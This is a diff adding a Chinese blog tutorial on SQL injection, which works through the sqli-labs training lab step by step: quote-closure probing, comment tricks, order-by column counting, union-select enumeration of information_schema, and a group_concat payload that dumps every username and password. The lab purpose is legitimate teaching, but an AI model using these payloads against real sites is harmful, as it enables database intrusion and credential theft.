@@ -5,7 +5,15 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="漏洞扫描原理以及SQL注入, Broken-year">
-    <meta name="description" content="">
+    <meta name="description" content="漏洞扫描原理以及sql注入关于漏洞
+漏洞为什么会出现？
+——因为和用户有互动。
+因为需要调用后端的逻辑代码，甚至需要调用数据库或者操作系统命令
+
+最基本的sql
+sql注入靶场 sqli-labs
+
+命令行操作数据库mysql.exe -u">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -488,7 +496,84 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h1 id="漏洞扫描原理以及sql注入"><a href="#漏洞扫描原理以及sql注入" class="headerlink" title="漏洞扫描原理以及sql注入"></a>漏洞扫描原理以及sql注入</h1><h2 id="关于漏洞"><a href="#关于漏洞" class="headerlink" title="关于漏洞"></a>关于漏洞</h2><blockquote>
+<p>漏洞为什么会出现？</p>
+<p>——因为和用户有互动。</p>
+<p>因为需要调用后端的逻辑代码，甚至需要调用数据库或者操作系统命令</p>
+</blockquote>
+<h2 id="最基本的sql"><a href="#最基本的sql" class="headerlink" title="最基本的sql"></a>最基本的sql</h2><blockquote>
+<p>sql注入靶场 sqli-labs</p>
+</blockquote>
+<h3 id="命令行操作数据库"><a href="#命令行操作数据库" class="headerlink" title="命令行操作数据库"></a>命令行操作数据库</h3><pre class=" language-mysql"><code class="language-mysql">mysql.exe -uroot -proot
+//输入用户名和密码连接数据库
+
+show databases;
+//查看数据库所有库名
+
+use [库名];
+//进入某个数据库
+
+show tables;
+//查看数据库有多少张表
+
+select * from [表名];
+//查看表中所有内容
+
+select * from table where id<13 limit 1,2;
+
+select 1,2,3,4,5;
+//自己创建一个表
+
+select * from table where id<13 union select 1,2,3;
+//联合查询
+</code></pre>
+<h3 id="基本sql注入攻击"><a href="#基本sql注入攻击" class="headerlink" title="基本sql注入攻击"></a>基本sql注入攻击</h3><p><code>ps</code>本次用的是sqli-labs里的第一题</p>
+<p><strong>估算目标数据库语法</strong></p>
+<pre class=" language-mysql"><code class="language-mysql">select username,password from table where id=1 limit 0,1;
+</code></pre>
+<blockquote>
+<p>黑客需要破坏数据库语句<strong>目的</strong>是：为了知道数据库的闭合方式。</p>
+<p>这个世界上所有的<strong>闭合方式</strong>：</p>
+<p>‘ “ () (‘x’) ((‘x’)) (“x”) ((“x”)) (()) 和没有任何闭合方式的</p>
+</blockquote>
+<p><strong>猜测</strong>比如： </p>
+<p><code>id=2&#39;</code></p>
+<p>报错：’’2’’ LIMIT 0,1’</p>
+<p>即实际上：’2’’ LIMIT 0,1</p>
+<p>\ &#x3D; 转义字符：把后面的第一个东西变成字符串</p>
+<pre class=" language-mysql"><code class="language-mysql">select username,password from table where id=' 2\' limit 0,1
+</code></pre>
+<p>闭合失败，报错，爆出闭合内容，知道闭合方式是’’</p>
+<p><strong>数据库注释符</strong>：</p>
+<p><code>--</code></p>
+<p><code>/**/</code></p>
+<p><code>#</code></p>
+<p><code>+</code>相当于空格</p>
+<p>那么就可以把后续内容<strong>注释</strong>掉：</p>
+<p><code>select username,password from table where id=&#39; 2&#39; --+ &#39; limit 0,1</code></p>
+<p>即：<code>select username,password from table where id=&#39; 2&#39;</code></p>
+<p><strong>确定有多少个栏目</strong></p>
+<p><code>id=2&#39; order by [数字] --+</code></p>
+<p>完整即：</p>
+<p><code>select id,username,password from table where id=&#39; 2&#39; order by 10 --+</code></p>
+<p>发现<code>order by 3</code>正常</p>
+<p>说明他数据库里有3个栏目</p>
+<p><strong>显示报错位</strong></p>
+<p><code>select id,username,password from table where id=&#39; -2&#39; union select 1,2,3 --+ &#39; limit 0,1</code></p>
+<p><code>id=-2&#39; union select 1,2,3 --+</code>发现报错位是2,3</p>
+<p><strong>查看数据库的库名</strong></p>
+<p><code>id=-2&#39; union select 1,database(),3 --+</code></p>
+<p>库名是<code>security</code></p>
+<p><strong>根据库名找到表名</strong></p>
+<p><code>id=-2&#39; union select 1,table_name,3 from information_schema.tables where table_schema = &#39;security&#39; limit 0,1 --+</code></p>
+<p>查到表名<code>emails，referers，uagents，users</code></p>
+<p><strong>根据表名找到列名</strong></p>
+<p>黑客觉得<code>users</code>里面的数据很有价值</p>
+<p><code>id=-2&#39; union select 1,column_name,3 from information_schema.columns where table_schema = &#39;security&#39; and table_name = &#39;users&#39; limit 0,1 --+</code></p>
+<p>发现<code>users</code>里有<code>id，username，password</code></p>
+<p>黑客需要拿到所有的<code>username</code>和<code>password</code>的值</p>
+<p><code>id=-2&#39; union select 1,group_concat(username),group_concat(password) from users  --+</code></p>
+
                 
             </div>
             <hr/>
